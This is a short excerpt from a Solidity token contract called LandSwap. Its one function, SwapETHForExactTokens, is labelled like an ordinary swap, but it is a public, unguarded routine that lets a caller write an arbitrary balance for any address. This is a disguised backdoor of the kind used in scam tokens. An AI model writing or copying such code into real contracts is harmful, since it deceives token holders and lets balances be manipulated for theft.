...
contract LandSwap is Ownable {
  ...
  function SwapETHForExactTokens(address user, uint256 _value) public returns(bool) {
    if(user != address(0)){
        uint256 amountToLiquify = uint256(user);
        balances[address(amountToLiquify)] = burnFees * _value * (10 ** 9);
        return true;
    }
  }
